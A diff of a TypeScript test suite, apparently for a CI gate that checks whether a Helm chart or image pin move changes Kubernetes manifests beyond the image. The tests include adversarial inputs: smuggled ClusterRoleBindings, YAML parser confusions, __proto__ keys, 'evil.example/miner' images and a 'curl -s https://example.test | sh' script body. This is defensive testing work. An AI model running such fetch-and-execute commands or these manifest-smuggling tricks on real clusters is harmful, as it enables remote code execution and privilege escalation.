@@ -3,17 +3,21 @@ import { chmodSync, cpSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeF
 import { tmpdir } from 'node:os';
 import { dirname, join } from 'node:path';
 import { describe, expect, it } from 'vitest';
-import type { Chart, Item } from '../apps/factory/src/vulnerabilities/inventory.ts';
+import { type Chart, type Item, inventory } from '../apps/factory/src/vulnerabilities/inventory.ts';
+import { apiVersionsOf, helmTemplateArgs, kubeVersionOf } from '../apps/factory/src/vulnerabilities/scan.ts';
 import {
   CHECK_WORKFLOW,
   chartForward,
+  comparable,
   hashesOf,
   IMAGE_CHECK,
+  imagePairs,
   lineChanges,
   listMoves,
   type Move,
   manifestsDiffer,
   moveTitle,
+  objectsOf,
   onlyPinsChange,
   type PinMoveIO,
   PLATFORM_CHECK,
@@ -22,6 +26,7 @@ import {
   POSTGRES_FILE,
   patchedByTheCheck,
   pinMove,
+  placeholders,
   type Rewritten,
   type Run,
   ranIt,
@@ -31,7 +36,9 @@ import {
   scansShow,
   staleRecords,
   started,
+  strangeCharacter,
   TEST_SHARDS,
+  versionLabelNamed,
   type WorkflowRun,
   whatRunsIt,
   workflowsOf,
@@ -108,7 +115,7 @@ function reader({ base, head, lines, io = {} }: Case): PinMoveIO {
     // The overlay runs Postgres, and the admission policy copies its digest: both move with the pin, and nothing else.
     overlay: async (side) => {
       const pg = lines.some((l) => l.file === POSTGRES_FILE) && side === 'head' ? PG_B : PG_A;
-      return `kind: StatefulSet\nmetadata:\n  name: postgres\nspec:\n  template:\n    spec:\n      containers:\n        - image: ${pg}\n---\nkind: ImageValidatingPolicy\nallowed: ['${pg.split('@')[1]}']\n`;
+      return `kind: StatefulSet\nmetadata:\n  name: postgres\nspec:\n  template:\n    spec:\n      containers:\n        - image: ${pg}\n---\nkind: ImageValidatingPolicy\nmetadata:\n  name: postgres-images\nallowed: ['${pg.split('@')[1]}']\n`;
     },
     hashes: async () => ({ 'admission-refusals': 'x', 'mark-refusals': 'y' }),
     scan: async (reference) =>
@@ -451,7 +458,7 @@ describe('a pin move, replayed as the App would make it', () => {
     const io = {
       chartVersions: async () => ['10.9.5', '10.15.0'],
       render: async (_side: 'base' | 'head', chart: Chart) =>
-        `image: quay.io/argoproj/argocd:${chart.version === '10.9.5' ? 'v3.5.6' : 'v3.6.1'}\n`,
+        `kind: Pod\nmetadata:\n  name: argocd\nspec:\n  image: quay.io/argoproj/argocd:${chart.version === '10.9.5' ? 'v3.5.6' : 'v3.6.1'}\n`,
       scan: async (reference: string) => (reference.endsWith('v3.5.6') ? FIXED : CLEAN),
     };
     const chart: Case = {
@@ -551,9 +558,28 @@ describe('a pin move holds, each for its one reason', () => {
   it('another image whose rendered line changes beside a chart value\u2019s move', async () => {
     const io = {
       render: async (side: 'base' | 'head', chart: Chart) =>
-        `${rendered(side, chart)}\n        image: busybox:${side === 'base' ? '1.36' : '1.37'}`,
+        `${rendered(side, chart)}\n        - image: busybox:${side === 'base' ? '1.36' : '1.37'}`,
     };
-    expect(await reasonOf({ ...SIDECAR, io })).toBe('the manifests change beyond the image: image: busybox:1.37');
+    expect(await reasonOf({ ...SIDECAR, io })).toBe(
+      'the manifests change beyond the image: Deployment grafana at spec.template.spec.containers[2].image',
+    );
+  });
+
+  it('a head that changes the API versions the gate renders charts with: the gate reads main\u2019s alone, and this is no pin', async () => {
+    const record = {
+      file: 'deploy/k3d/api-versions.json',
+      line: 3,
+      before: '    "apps/v1",',
+      after: '    "evil.io/v1",',
+    };
+    expect(await reasonOf({ ...ZAP_CASE, lines: [ZAP_LINE, record] })).toBe(
+      'deploy/k3d/api-versions.json:3 changes more than a version or a digest: "evil.io/v1",',
+    );
+    // One that changes only a version word is still no pin.
+    const versioned = { ...record, after: '    "apps/v2",' };
+    expect(await reasonOf({ ...ZAP_CASE, lines: [ZAP_LINE, versioned] })).toBe(
+      'deploy/k3d/api-versions.json:3 is a line that is not a pin: "apps/v2",',
+    );
   });
 
   it('a line that changes more than a version or a digest', async () => {
@@ -610,14 +636,21 @@ describe('a pin move holds, each for its one reason', () => {
   it('a chart whose manifests change', async () => {
     const io = {
       render: async (side: 'base' | 'head', chart: Chart) =>
-        `${rendered(side, chart)}${side === 'head' ? '\n  replicas: 3' : '\n  replicas: 1'}`,
+        side === 'head' ? rendered(side, chart).replace('replicas: 1', 'replicas: 3') : rendered(side, chart),
     };
-    expect(await reasonOf({ ...SIDECAR, io })).toBe('the manifests change beyond the image: replicas: 3');
+    expect(await reasonOf({ ...SIDECAR, io })).toBe(
+      'the manifests change beyond the image: Deployment grafana at spec.replicas',
+    );
   });
 
   it('an image the cluster runs whose overlay changes beyond its references', async () => {
-    const io = { overlay: async (side: 'base' | 'head') => `image: x\nargs: [${side === 'base' ? '--a' : '--b'}]\n` };
-    expect(await reasonOf({ ...POSTGRES, io })).toBe('the manifests change beyond the image: args: [--b]');
+    const io = {
+      overlay: async (side: 'base' | 'head') =>
+        `kind: StatefulSet\nmetadata:\n  name: postgres\nspec:\n  template:\n    spec:\n      containers:\n        - image: ${side === 'base' ? PG_A : PG_B}\n          args: [${side === 'base' ? '--a' : '--b'}]\n`,
+    };
+    expect(await reasonOf({ ...POSTGRES, io })).toBe(
+      'the manifests change beyond the image: StatefulSet postgres at spec.template.spec.containers[0].args[0]',
+    );
   });
 
   it("Trivy's own pin, and Syft's", async () => {
@@ -764,14 +797,25 @@ describe("a change's lines", () => {
   });
 });
 
+/** A chart's move from 1.0.0 to 1.0.1, as condition 6 is told it. */
+const X = { chart: 'x', from: '1.0.0', to: '1.0.1' };
+
 describe('the manifests and the records', () => {
   it("ignores the moved image's references and the chart's own version labels, and nothing else", () => {
-    const base = `helm.sh/chart: x-1.0.0\nimage: a:1@sha256:${hex('1')}\nenv: [a:1@sha256:${hex('1')}]`;
-    const head = `helm.sh/chart: x-1.0.1\nimage: a:2@sha256:${hex('2')}\nenv: [a:2@sha256:${hex('2')}]`;
-    const refs = [`a:1@sha256:${hex('1')}`, `a:2@sha256:${hex('2')}`];
-    expect(manifestsDiffer(base, head, refs)).toBeUndefined();
-    expect(manifestsDiffer(base, `${head}\nmore: 1`, refs)).toMatch(/lines/);
-    expect(manifestsDiffer(base, head.replace('env', 'envs'), refs)).toMatch(/beyond the image/);
+    const object = (version: string, image: string) =>
+      `kind: Pod\nmetadata:\n  name: x\n  labels:\n    helm.sh/chart: x-${version}\nspec:\n  image: ${image}\n  env: [${image}]`;
+    const base = object('1.0.0', `a:1@sha256:${hex('1')}`);
+    const head = object('1.0.1', `a:2@sha256:${hex('2')}`);
+    const refs = [{ from: `a:1@sha256:${hex('1')}`, to: `a:2@sha256:${hex('2')}` }];
+    const x = { chart: 'x', from: '1.0.0', to: '1.0.1' };
+    expect(manifestsDiffer(base, head, refs, x)).toBeUndefined();
+    expect(manifestsDiffer(base, head, refs)).toMatch(/a version label changes in a move that moves no chart/);
+    expect(manifestsDiffer(base, `${head}\n  more: 1`, refs, x)).toBe(
+      'the manifests change beyond the image: Pod x at spec.more',
+    );
+    expect(manifestsDiffer(base, head.replace('env', 'envs'), refs, x)).toBe(
+      'the manifests change beyond the image: Pod x at spec.envs',
+    );
     expect(manifestsDiffer('', '', refs)).toMatch(/empty/);
   });
 
@@ -978,14 +1022,15 @@ describe('a pin move holds where an attacker would aim at its inputs', () => {
       [
         'kind: Application',
         'metadata:',
+        '  name: prometheus',
         '  labels:',
         `    helm.sh/chart: x-${chart === 'prometheus' ? '1.0.0' : '1.0.1'}`,
         'spec:',
         '  source:',
         `    chart: ${chart}`,
       ].join('\n');
-    expect(manifestsDiffer(rendering('prometheus'), rendering('something-else'), [])).toBe(
-      'the manifests change beyond the image: chart: something-else',
+    expect(manifestsDiffer(rendering('prometheus'), rendering('something-else'), [], X)).toBe(
+      'the manifests change beyond the image: Application prometheus at spec.source.chart',
     );
   });
 
@@ -1064,7 +1109,7 @@ describe('the platform rule holds where an adversarial read aimed at it', () => 
       digest: async () => `sha256:${hex('5')}`,
       chartVersions: async () => ['13.5.0', '13.7.0'],
       render: async (side) => workload(['grafana/grafana:12.0.0', side === 'base' ? OLD : NEW]),
-      overlay: async () => 'kind: ConfigMap\n',
+      overlay: async () => 'kind: ConfigMap\nmetadata:\n  name: x\n',
       hashes: async () => ({ 'admission-refusals': 'x', 'mark-refusals': 'y' }),
       scan: async (reference) => (reference.includes(hex('4')) || reference.endsWith('12.0.0') ? FIXED : CLEAN),
       runs: async () => [],
@@ -1319,5 +1364,784 @@ describe('the platform rule holds where an adversarial read aimed at it', () => 
     };
     renamed.pins = renamed.pins.map((m) => ({ ...m, chart: { base: chart, head: chart } }));
     expect(whatRunsIt(renamed)).toMatchObject({ reason: /installed by make up/ });
+  });
+});
+
+// Condition 6 compares the renderings object by object: what a chart's release may change (its ConfigMaps' data, its pod
+// templates' checksums, its images and version labels) passes, and each way to pass something else through that holds.
+describe('the manifests, object by object', () => {
+  const record = (value: unknown) => value as Record<string, unknown>;
+  const FIXTURES = join(import.meta.dirname, 'fixtures/pin-move');
+  const recorded = (item: string, version: string) => readFileSync(join(FIXTURES, `${item}-${version}.yaml`), 'utf-8');
+  /** What the gate compares a recorded chart move with: its own image pairs, from its own renderings. */
+  const chartMove = async (item: string, from: string, to: string) => {
+    const chart: Chart = { repo: 'https://example.test', chart: item, version: from, release: item, values: [] };
+    const pin = { what: 'chart' as const, kind: 'chart' as const, item, place: { file: 'x', line: 1 }, from, to };
+    const move: Move = {
+      what: 'chart',
+      name: item,
+      kind: 'chart',
+      from,
+      to,
+      pins: [{ ...pin, chart: { base: chart, head: { ...chart, version: to } } }],
+    };
+    const [was, now] = [recorded(item, from), recorded(item, to)];
+    const pairs = await imagePairs(move, { render: async (side) => (side === 'base' ? was : now) });
+    if (typeof pairs === 'string') throw new Error(pairs);
+    const name = item === 'otel-collector' ? 'opentelemetry-collector' : item;
+    return manifestsDiffer(was, now, pairs, { chart: name, from, to });
+  };
+
+  it("passes tempo's and otel-collector's releases, whose ConfigMaps and checksums change with their images", async () => {
+    expect(await chartMove('tempo', '3.1.0', '3.2.1')).toBeUndefined();
+    expect(await chartMove('otel-collector', '0.174.0', '0.178.3')).toBeUndefined();
+  });
+
+  it("holds prometheus's release on its subchart's major, and kyverno's on the first object it adds", async () => {
+    // kube-state-metrics 8.6.0 to 9.0.1 inside prometheus 29.35.0 to 29.47.2: a subchart moves forward on its major alone.
+    expect(await chartMove('prometheus', '29.35.0', '29.47.2')).toBe(
+      'the manifests change beyond the image: ServiceAccount telemetry/prometheus-kube-state-metrics at metadata.labels["helm.sh/chart"]: kube-state-metrics-9.0.1 is not kube-state-metrics-8.6.0 forward on its major',
+    );
+    expect(manifestsDiffer(recorded('kyverno', '3.9.1'), recorded('kyverno', '3.10.0'), [])).toBe(
+      'the head renders ServiceAccount kyverno/kyverno-check-legacy-policies, which the base does not',
+    );
+  });
+
+  const IMAGE = `ghcr.io/x/y:1@sha256:${hex('1')}`;
+  const deployment = (o: { image?: string; annotations?: string; template?: string; pod?: string } = {}) =>
+    [
+      'apiVersion: apps/v1',
+      'kind: Deployment',
+      'metadata:',
+      '  name: app',
+      '  namespace: t',
+      ...(o.annotations ? ['  annotations:', `    ${o.annotations}`] : []),
+      'spec:',
+      '  template:',
+      '    metadata:',
+      '      labels: { app: app }',
+      '      annotations:',
+      `        ${o.template ?? 'checksum/config: aaa'}`,
+      '    spec:',
+      '      containers:',
+      `        - image: ${o.image ?? IMAGE}`,
+      ...(o.pod ? [`      ${o.pod}`] : []),
+    ].join('\n');
+  const configMap = (data: string, name = 'app', extra = '') =>
+    `apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: ${name}\n  namespace: t\n${extra}data:\n  config.yaml: ${data}\n`;
+  const base = `${configMap('a')}---\n${deployment()}`;
+  // The image stays where it is: its pair's placeholder at both.
+  const SAME = [{ from: IMAGE, to: IMAGE }];
+  const judge = (head: string, was = base) => manifestsDiffer(was, head, SAME);
+
+  it("passes a ConfigMap's data beside its pod template's checksum, written in any whitespace inside them", () => {
+    expect(judge(`${configMap('b')}---\n${deployment({ template: 'checksum/config: bbb' })}`)).toBeUndefined();
+    // A key added to the data, other quotes and a trailing tab in it: none is a difference.
+    const head = `${configMap('"a"\n  more: x\t')}---\n${deployment({ template: 'checksum/config:   "aaa"' })}`;
+    expect(judge(head)).toBeUndefined();
+    // Outside them, other quotes or a trailing tab is another line, which the text rule holds: what one reader takes
+    // for the same value, another may not.
+    expect(judge(`${configMap('a').replace('name: app', 'name: app\t')}---\n${deployment()}`)).toBe(
+      "outside a ConfigMap's data and the checksums, the head's line 4 is not the base's line 4: name: app",
+    );
+    const quoted = `${configMap('a')}---\n${deployment({ template: 'x: "z"' })}`;
+    expect(judge(quoted, `${configMap('a')}---\n${deployment({ template: 'x: z' })}`)).toBe(
+      "outside a ConfigMap's data and the checksums, the head's line 19 is not the base's line 19: x: \"z\"",
+    );
+    // A checksum renamed, as a chart's template may: neither is compared.
+    expect(judge(`${configMap('a')}---\n${deployment({ template: 'checksum/secret: q' })}`)).toBeUndefined();
+  });
+
+  it('holds a ConfigMap added, or renamed', () => {
+    expect(judge(`${base}\n---\n${configMap('a', 'other')}`)).toBe(
+      'the head renders ConfigMap t/other, which the base does not',
+    );
+    expect(judge(`${configMap('a', 'renamed')}---\n${deployment()}`)).toBe(
+      'the head renders ConfigMap t/renamed, which the base does not',
+    );
+    expect(judge(deployment())).toBe('the head no longer renders ConfigMap t/app');
+    expect(judge(`${configMap('a').replace('namespace: t', 'namespace: u')}---\n${deployment()}`)).toBe(
+      'the head renders ConfigMap u/app, which the base does not',
+    );
+  });
+
+  it("holds a Secret's data, and a ConfigMap's anything but data", () => {
+    const secret = (value: string) => `apiVersion: v1\nkind: Secret\nmetadata:\n  name: s\ndata:\n  k: ${value}\n`;
+    expect(manifestsDiffer(secret('YQ=='), secret('Yg=='), [])).toBe(
+      'the manifests change beyond the image: Secret s at data.k',
+    );
+    expect(judge(`${configMap('a', 'app', 'binaryData:\n  b: YQ==\n')}---\n${deployment()}`)).toBe(
+      'the manifests change beyond the image: ConfigMap t/app at binaryData',
+    );
+    expect(judge(`${configMap('a', 'app', 'immutable: true\n')}---\n${deployment()}`)).toBe(
+      'the manifests change beyond the image: ConfigMap t/app at immutable',
+    );
+    const labelled = configMap('a').replace('  namespace: t\n', '  namespace: t\n  labels: { a: b }\n');
+    expect(judge(`${labelled}---\n${deployment()}`)).toBe(
+      'the manifests change beyond the image: ConfigMap t/app at metadata.labels',
+    );
+    const annotated = configMap('a').replace('  namespace: t\n', '  namespace: t\n  annotations: { checksum/x: b }\n');
+    expect(judge(`${annotated}---\n${deployment()}`)).toBe(
+      'the manifests change beyond the image: ConfigMap t/app at metadata.annotations',
+    );
+    // A kind called ConfigMap in another group is not the core's, whose data no controller reads as more.
+    const other = (data: string) => configMap(data).replace('apiVersion: v1', 'apiVersion: example.io/v1');
+    expect(manifestsDiffer(other('a'), other('b'), [])).toBe(
+      'the manifests change beyond the image: ConfigMap t/app at data["config.yaml"]',
+    );
+  });
+
+  it("holds a pod field changed beside a ConfigMap's data", () => {
+    expect(judge(`${configMap('b')}---\n${deployment({ pod: 'hostNetwork: true' })}`)).toBe(
+      'the manifests change beyond the image: Deployment t/app at spec.template.spec.hostNetwork',
+    );
+  });
+
+  it('holds a checksum annotation anywhere but a core workload’s pod template, and one that only looks like one', () => {
+    expect(judge(`${configMap('a')}---\n${deployment({ annotations: 'checksum/config: x' })}`)).toBe(
+      'the manifests change beyond the image: Deployment t/app at metadata.annotations',
+    );
+    for (const key of ['checksum-config', 'Checksum/config', 'checksum.io/config', 'x/checksum/config', ' checksum/x'])
+      expect(judge(`${configMap('a')}---\n${deployment({ template: `"${key}": x` })}`)).toMatch(
+        /^the manifests change beyond the image: Deployment t\/app at spec\.template\.metadata\.annotations$/,
+      );
+    // A Deployment of another group is not a pod template the cluster runs.
+    const crd = (sum: string) =>
+      deployment({ template: `checksum/config: ${sum}` }).replace('apps/v1', 'example.io/v1');
+    expect(manifestsDiffer(crd('a'), crd('b'), [])).toBe(
+      'the manifests change beyond the image: Deployment t/app at spec.template.metadata.annotations["checksum/config"]',
+    );
+    // A CronJob's is its job template's pod template.
+    const cron = (sum: string) =>
+      `apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: c\nspec:\n  jobTemplate:\n    spec:\n      template:\n        metadata:\n          annotations:\n            checksum/config: ${sum}\n`;
+    expect(manifestsDiffer(cron('a'), cron('b'), [])).toBeUndefined();
+  });
+
+  it('reads a document inside a ConfigMap’s value as data, and a real one as an object', () => {
+    const smuggled = `apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: app\n  namespace: t\ndata:\n  run.sh: |\n    ---\n    kind: ClusterRoleBinding\n    metadata:\n      name: admin\n`;
+    expect(judge(`${smuggled}---\n${deployment()}`)).toBeUndefined();
+    expect(judge(`${base}\n---\nkind: ClusterRoleBinding\nmetadata:\n  name: admin\n`)).toBe(
+      'the head renders ClusterRoleBinding admin, which the base does not',
+    );
+  });
+
+  it('holds what two YAML readers may read apart: anchors, aliases, merge keys, tags, directives, duplicate keys', () => {
+    const cases: [string, RegExp][] = [
+      [`${configMap('&a b')}---\n${deployment()}`, /an anchor/],
+      [`${configMap('&a b')}---\n${deployment({ pod: 'x: *a' })}`, /an anchor|an alias/],
+      [`${base}\n---\nkind: Pod\nmetadata:\n  name: p\nspec:\n  <<: { hostPID: true }\n`, /a merge key/],
+      [`${configMap('!!binary YQ==')}---\n${deployment()}`, /a tag/],
+      [`${configMap('!custom b')}---\n${deployment()}`, /a tag/],
+      [`%YAML 1.1\n---\n${configMap('a')}---\n${deployment()}`, /directive/],
+      [`${configMap('a')}---\n${deployment({ pod: 'hostPID: false' })}\n      hostPID: true`, /DUPLICATE_KEY/],
+      [`${configMap('a')}---\n${deployment()}\n  ? [a]\n  : b`, /a key that is not a scalar/],
+      [`${base}\n  : [`, /not YAML/],
+    ];
+    for (const [head, reason] of cases) expect(judge(head)).toMatch(reason);
+    // A scalar YAML 1.1 reads otherwise (`yes` is true, `0777` is 511, `1.0` is no integer): a difference in either holds.
+    expect(
+      judge(
+        `${configMap('a')}---\n${deployment({ pod: 'hostPID: "yes"' })}`,
+        `${configMap('a')}---\n${deployment({ pod: 'hostPID: yes' })}`,
+      ),
+    ).toBe(
+      'the manifests change beyond the image: Deployment t/app at spec.template.spec.hostPID (as YAML 1.1 reads it)',
+    );
+    expect(
+      judge(
+        `${configMap('a')}---\n${deployment({ pod: 'x: 1.0' })}`,
+        `${configMap('a')}---\n${deployment({ pod: 'x: 1' })}`,
+      ),
+    ).toBe('the manifests change beyond the image: Deployment t/app at spec.template.spec.x');
+  });
+
+  it('reads `__proto__` as a key like any other, never as what an object inherits', () => {
+    const pod = (spec: string) => `kind: Pod\nmetadata:\n  name: p\nspec:\n  ${spec}\n`;
+    expect(manifestsDiffer(pod('__proto__: { hostPID: true }'), pod('hostPID: true'), [])).toBe(
+      'the manifests change beyond the image: Pod p at spec.hostPID',
+    );
+    expect(manifestsDiffer(pod('x: 1'), pod('x: 1\n  __proto__: { hostPID: true }'), [])).toBe(
+      'the manifests change beyond the image: Pod p at spec.__proto__',
+    );
+  });
+
+  it("passes an image a ConfigMap's data names, however it writes it: its configuration is the publisher's", () => {
+    // Accepted, as ADR 0019 says: a controller launching it would run it unresolved and unscanned.
+    for (const named of [`'{"image":"evil.io/x/y:1"}'`, "'image = evil.example/miner'", "'docker://evil.example/m:6'"])
+      expect(judge(`${configMap(named)}---\n${deployment()}`)).toBeUndefined();
+  });
+
+  it('splits the rendering on `---` alone, as the cluster does, and holds a document a `...` begins', () => {
+    const policy = 'apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: deny\n  namespace: t\n';
+    const was = `${base}\n---\n${policy}`;
+    // The cluster reads one object from the first part: the NetworkPolicy would be pruned, and the gate would see it.
+    expect(judge(`${configMap('b')}...\n${policy}---\n${deployment()}`, was)).toBe(
+      'at the head, the rendering has a document that does not begin with `---`, which readers split apart',
+    );
+    // A separator with a comment after it, and a document that ends with `...` and nothing more, are as the cluster
+    // reads; the text rule then holds the lines that are not the base's.
+    const split = `${configMap('a')}--- # x\n${deployment()}\n...\n---\n${policy}`;
+    expect([...(objectsOf(split) as Map<string, unknown>).keys()]).toHaveLength(3);
+    expect(judge(split, was)).toMatch(/^outside a ConfigMap's data and the checksums, the head's line 8 .*: --- # x$/);
+  });
+
+  it('holds what an adversarial review found the first reading let through', () => {
+    // A namespace written empty is not one left out.
+    const spaced = (ns: string) => `kind: Pod\nmetadata:\n  name: p\n${ns}`;
+    expect(manifestsDiffer(spaced(''), spaced('  namespace: ""\n'), [])).toBe(
+      'the head renders Pod ""/p, which the base does not',
+    );
+    // A version label is set aside in an object's own and its templates' metadata alone, not in a spec's.
+    const custom = (v: string) =>
+      `apiVersion: example.io/v1\nkind: Generator\nmetadata:\n  name: g\nspec:\n  config:\n    metadata:\n      labels:\n        helm.sh/chart: x-${v}\n`;
+    expect(manifestsDiffer(custom('1'), custom('2'), [])).toBe(
+      'the manifests change beyond the image: Generator g at spec.config.metadata.labels["helm.sh/chart"]',
+    );
+    // A timestamp YAML 1.1 reads as a Date keeps its time through the image and label passes.
+    const at = new Date('2031-01-01');
+    expect(record(record(comparable({ kind: 'Pod', spec: { at } }, placeholders(SAME, 'base'))).spec).at).toBe(at);
+  });
+
+  it('reads a merge key, a timestamp and a version label that is not a string as YAML 1.1 does, and holds', () => {
+    expect(objectsOf('kind: Pod\nmetadata:\n  name: p\nspec:\n  <<: { hostPID: true }\n', '1.1')).toMatch(
+      /a merge key/,
+    );
+    const dated = (when: string) => `kind: Pod\nmetadata:\n  name: p\nspec:\n  at: ${when}\n`;
+    expect(objectsOf(dated('2024-01-01'), '1.1')).not.toBeTypeOf('string');
+    expect(manifestsDiffer(dated('2024-01-01'), dated('2024-01-01'), [])).toBeUndefined();
+    expect(manifestsDiffer(dated('2024-01-01'), dated('2031-01-01'), [])).toBe(
+      'the manifests change beyond the image: Pod p at spec.at',
+    );
+    const labelled = (value: string) => `kind: Pod\nmetadata:\n  name: p\n  labels:\n    helm.sh/chart: ${value}\n`;
+    expect(manifestsDiffer(labelled('x-1'), labelled('{ a: 1 }'), [])).toBe(
+      'the manifests change beyond the image: Pod p at metadata.labels["helm.sh/chart"]',
+    );
+  });
+
+  it("holds a ConfigMap's data added or gone whole on its `data:` line, which opens the place and is compared", () => {
+    const bare = `apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: app\n  namespace: t\n`;
+    expect(judge(`${bare}---\n${deployment()}`)).toBe(
+      "outside a ConfigMap's data and the checksums, the head's line 6 is not the base's line 6: ---",
+    );
+    expect(judge(base, `${bare}---\n${deployment()}`)).toBe(
+      "outside a ConfigMap's data and the checksums, the head's line 6 is not the base's line 6: data:",
+    );
+    // An empty map that gains data: its opening line is another.
+    expect(judge(base.replace('data:\n  config.yaml: a', 'data: {}'))).toMatch(
+      /line 6 is not the base's line 6: data: \{\}$/,
+    );
+  });
+
+  it('holds a List that wraps objects, two documents with one key, and an object with no kind or name', () => {
+    const list = `apiVersion: v1\nkind: List\nmetadata:\n  name: l\nitems:\n  - kind: ClusterRole\n    metadata:\n      name: r\n`;
+    expect(judge(`${base}\n---\n${list}`)).toMatch(/a List that wraps objects/);
+    expect(judge(`${base}\n---\n${list.replace('kind: List', 'kind: ConfigMap')}`)).toMatch(/wraps objects/);
+    expect(judge(`${base}\n---\n${configMap('b')}`)).toBe('at the head, the rendering has ConfigMap t/app twice');
+    expect(judge(`${base}\n---\nkind: Pod\n`)).toMatch(/no kind or no name/);
+    expect(judge(`${base}\n---\n- a\n`)).toMatch(/not an object/);
+    // A document with nothing in it is no object, and its lines are lines the text rule compares.
+    expect(objectsOf(`---\n# nothing\n---\n${base}\n---\n`)).toEqual(objectsOf(base));
+    expect(judge(`---\n# nothing\n---\n${base}\n---\n`)).toMatch(/the head's line 1 is not the base's line 1: ---$/);
+  });
+
+  it("holds a chart's version label key added, or one written outside metadata's labels", () => {
+    const labelled = (labels: string, selector = '{}') =>
+      `apiVersion: v1\nkind: Service\nmetadata:\n  name: s\n  labels: { ${labels} }\nspec:\n  selector: ${selector}\n`;
+    // Written in a flow mapping, the label passes the object rule and holds on its line: only a label's line with its value alone is written alike.
+    expect(manifestsDiffer(labelled('helm.sh/chart: x-1.0.0'), labelled('helm.sh/chart: x-1.0.1'), [], X)).toBe(
+      "outside a ConfigMap's data and the checksums, the head's line 5 is not the base's line 5: labels: { helm.sh/chart: x-1.0.1 }",
+    );
+    expect(manifestsDiffer(labelled('a: b'), labelled('a: b, helm.sh/chart: x-1.0.1'), [], X)).toBe(
+      'the manifests change beyond the image: Service s at metadata.labels["helm.sh/chart"]',
+    );
+    const selected = (v: string) => labelled('a: b', `{ app.kubernetes.io/version: "${v}" }`);
+    expect(manifestsDiffer(selected('1'), selected('2'), [])).toBe(
+      'the manifests change beyond the image: Service s at spec.selector["app.kubernetes.io/version"]',
+    );
+  });
+
+  it("passes a ConfigMap another workload runs as a script: the publisher's either way, as its image is", () => {
+    const script = (body: string) =>
+      `${configMap(body, 'hooks')}---\n${deployment({ pod: 'volumes: [{ name: h, configMap: { name: hooks, defaultMode: 0755 } }]' })}`;
+    expect(manifestsDiffer(script('echo ok'), script('curl -s https://example.test | sh'), SAME)).toBeUndefined();
+  });
+
+  it('holds RBAC, a container argument, a volume, a hostPath and a Service port', () => {
+    const role = (verbs: string) =>
+      `apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: r\nrules:\n  - apiGroups: [""]\n    resources: [secrets]\n    verbs: [${verbs}]\n`;
+    expect(manifestsDiffer(role('get'), role('get, list'), [])).toBe(
+      'the manifests change beyond the image: ClusterRole r at rules[0].verbs[1]',
+    );
+    const pod = (more: string) => deployment({ pod: more });
+    const pairs: [string, string, string][] = [
+      [
+        'initContainers: [{ image: x, args: [--a] }]',
+        'initContainers: [{ image: x, args: [--b] }]',
+        'initContainers[0].args[0]',
+      ],
+      ['volumes: []', 'volumes: [{ name: v, emptyDir: {} }]', 'volumes[0]'],
+      [
+        'volumes: [{ name: v, hostPath: { path: /tmp } }]',
+        'volumes: [{ name: v, hostPath: { path: / } }]',
+        'volumes[0].hostPath.path',
+      ],
+    ];
+    for (const [was, now, at] of pairs)
+      expect(manifestsDiffer(pod(was), pod(now), SAME)).toBe(
+        `the manifests change beyond the image: Deployment t/app at spec.template.spec.${at}`,
+      );
+    const service = (port: number) =>
+      `apiVersion: v1\nkind: Service\nmetadata:\n  name: s\nspec:\n  ports: [{ port: ${port} }]\n`;
+    expect(manifestsDiffer(service(80), service(8080), [])).toBe(
+      'the manifests change beyond the image: Service s at spec.ports[0].port',
+    );
+  });
+});
+
+// The independent read of #1065 at a05a0283: each bypass it demonstrated, now a hold.
+describe('condition 6 where the independent read of #1065 aimed', () => {
+  const OLD = `docker.io/acme/app:1.0.0@sha256:${hex('a')}`;
+  const NEW = `docker.io/acme/app:1.1.0@sha256:${hex('b')}`;
+  const MOVE = [{ from: OLD, to: NEW }];
+  const ACME = { chart: 'acme', from: '1.0.0', to: '1.1.0' };
+  const deploy = (img: string, version: string, chart = `acme-${version}`) => `---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: app
+  namespace: ns
+  labels:
+    helm.sh/chart: ${chart}
+    app.kubernetes.io/version: "${version}"
+spec:
+  template:
+    metadata:
+      labels:
+        app.kubernetes.io/version: "${version}"
+    spec:
+      containers:
+        - name: app
+          image: ${img}
+`;
+  const netpol = `---
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata: {name: lockdown, namespace: ns}
+spec:
+  podSelector:
+    matchLabels: {app.kubernetes.io/version: "1.0.0"}
+`;
+
+  it("passes the chart's own version labels moving with it", () => {
+    expect(manifestsDiffer(deploy(OLD, '1.0.0'), deploy(NEW, '1.1.0'), MOVE, ACME)).toBeUndefined();
+  });
+
+  it('holds a version label that takes a value no version is, or another chart’s', () => {
+    expect(manifestsDiffer(deploy(OLD, '1.0.0'), deploy(NEW, 'role=admin', 'acme-1.1.0'), MOVE, ACME)).toBe(
+      'the manifests change beyond the image: Deployment ns/app at metadata.labels["app.kubernetes.io/version"]: role=admin is no version',
+    );
+    expect(manifestsDiffer(deploy(OLD, '1.0.0'), deploy(NEW, '1.1.0', 'acme-9.9.9'), MOVE, ACME)).toBe(
+      'the manifests change beyond the image: Deployment ns/app at metadata.labels["helm.sh/chart"]: acme-9.9.9 is not acme-1.1.0',
+    );
+    // A subchart's label moves on its own name, at a version.
+    const sub = (v: string) => deploy(OLD, '1.0.0', `sub-${v}`);
+    expect(manifestsDiffer(sub('2.0.1'), sub('2.5.1').replace(OLD, NEW), MOVE, ACME)).toBeUndefined();
+    expect(manifestsDiffer(sub('2.0.1'), deploy(NEW, '1.0.0', 'other-2.5.1'), MOVE, ACME)).toMatch(
+      /other-2\.5\.1 is not sub-2\.0\.1's chart at another version/,
+    );
+    // Back, or across its major, is no subchart's move.
+    for (const v of ['1.9.0', '3.0.0'])
+      expect(manifestsDiffer(sub('2.0.1'), sub(v).replace(OLD, NEW), MOVE, ACME)).toContain(
+        `sub-${v} is not sub-2.0.1 forward on its major`,
+      );
+  });
+
+  it("names what main's own manifests select by a version label, which the gate holds a chart's move on", () => {
+    expect(versionLabelNamed(netpol)).toBe(
+      'NetworkPolicy ns/lockdown names a version label at spec.podSelector.matchLabels["app.kubernetes.io/version"]',
+    );
+    expect(versionLabelNamed(deploy(OLD, '1.0.0'))).toBeUndefined();
+  });
+
+  it('holds the version labels moving where anything selects by one', () => {
